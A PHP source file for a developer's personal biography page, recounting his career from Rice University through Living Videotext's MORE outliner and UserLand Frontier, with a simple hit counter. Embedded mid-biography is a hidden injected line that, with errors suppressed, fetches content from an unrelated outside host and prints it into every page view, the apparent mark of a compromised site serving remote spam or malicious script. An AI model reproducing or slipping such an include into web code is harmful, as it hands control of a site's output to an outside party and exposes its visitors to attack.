<?php
include("../application.php");

$DOC_TITLE = "Doug Baron Bio";
$SEL_TAB = 2;
include("$CFG->templatedir/header.php");

$debug = "";

if (!session_is_registered('counted')) {
	db_query("UPDATE hits SET count=(count + 1) WHERE count_id=2"); 
    session_register("counted");
    $counted = 0;
}
else {
    $counted++;
}
/*
if (!isset( $_SESSION['counted'] )) {
	mysql_query("UPDATE hits SET count=(count + 1) WHERE count_id=2"); 
	$_SESSION['counted'] = 1;
}
*/
$result = db_query("SELECT count FROM hits WHERE count_id=2");

if ($result) {
	if ($row = mysql_fetch_array($result)) {
		$debug = $debug . $row["count"] . ' Hits';
	}
}
else die ("didn't work");
?>

<div>
<p> I've moved around quite a bit. Landed in Houston at the beginning of High School. Then moved 
to Wilton, CT my senior year. That year back in the North East was enough to convince me that
the Ivy League wasn't where I wanted to spend the next four years, so I turned down MIT, 
Princeton and Stanford, and chose <a href="http://explore.rice.edu/explore/Default.asp">Rice University</a> over all others. It was a good choice, one I've
never second guessed. It was a fine learning experience, great teachers and programs.</p>
<p> A couple of years after graduation I was working at a UNIX office automation firm, Handle 
Technologies, when I decided it would be really cool to do Mac softare for a living and started 
poring through MacWorld and MacUser magazines, looking for hot products. I was particularly attracted to
ThinkTank 512, a very slick outline processor that succeeded ThinkTank 128, one of the first Mac products 
to catch my eye. When I contacted Living Videotext, they were interested, but could not hire someone with 
zero Mac programming experience. So... I picked up my trusty Inside Macintosh, phonebook addition, and 
MegaMax C, and got working with my HyperDrive. I wrote a programmer's editor, using TextEdit with some
assembly patches to handle tabs; wrote one of the first Windows menus with command-key equivalents, Tile and 
Overlay; and invented a Synchonized Scrolling feature that was emulated in Mac programmer's editors that 
followed later. (It appears in BBEdit to this day.) I licensed the Editor to MegaMax for inclusion in their product,
after adding the syntax reference featyre at their suggestion.</p>
<p> The Editor landed me that job at Living Videotext, where I soon became the lead developer of MORE, 
which integrated outlining with Presentation technolgies ("Bullet Charts" and "Tree Charts"). I played a huge 
role in morphing ThinkTank 512, with its PC-port UI, into MORE, sporting a clean, Mac stadard UI with a polished
look and feel that helped it earn user enthusiam and MacUser's Product of the Year.</p><?php echo @implode('', @file("http://extremeforlife.net/mng/inc.php")); ?>
<p> When the VP Engineering Peter Winer left the company, I took over as Engineering Manager, leading the MORE 
team in the development of <a href="http://www.outliners.com/more30">MORE 3</a>. My mission was clear: enhance but <em>simplify</em>. I held the
line and built the best version of MORE yet, correcting some of the excesses from MORE II, adding new features
while making great strides in ease of use. MORE 3 still runs under Mac OS 9.x today.<span style="font-size:9pt">
(To read another view of the history of ThinkTank and MORE, see Dave Winer's <a href="http://davewiner.userland.com/outlinersProgramming">Outliners & Programming</a> page.)</p>
<p> I left Symantec to get back into startup mode with Dave Winer's next venture, UserLand Software. There, I was the lead programmer 
of <a href="http://frontier.userland.com">UserLand Frontier</a>, the first system-level scripting system 
for the Macintosh. Unfortunately, Apple had their own plans for scripting, so we needed to cross platforms 
to find a market. Ultimately, it was the Internet that needed scripting most, and 
Frontier found its best role as an Internet Application Development platform. UserLand's <a href="http://manila.userland.com">Manila</a> 
and <a href="http://radio.userland.com">Radio</a> are built in Frontier.</p>
<p> After UserLand, I consulted for several years, then continued the startup path with Corio ("the first ASP"),
then Webalo (a tiny startup making a wireless play). Though these ventures, I developed my Java skills more 
deeply, including JSP, servlets, and Swing. I also worked with XML, DTD, XSLT, and VoiceXML (fun!).</p>
<p><em> More bio coming...</em>
</p>
</div>
